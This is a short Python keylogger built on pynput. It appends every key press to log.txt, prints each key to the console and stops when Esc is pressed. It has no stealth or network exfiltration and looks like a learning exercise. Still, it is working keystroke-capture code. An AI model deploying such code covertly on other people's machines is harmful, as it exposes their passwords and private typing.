import pynput
from pynput.keyboard import Key,Listener

key_lst = []
def on_press(Key):
    f = open("log.txt","a")
    f.write(str(Key)+"\n")
    print("{0} pressed".format(Key))
    f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()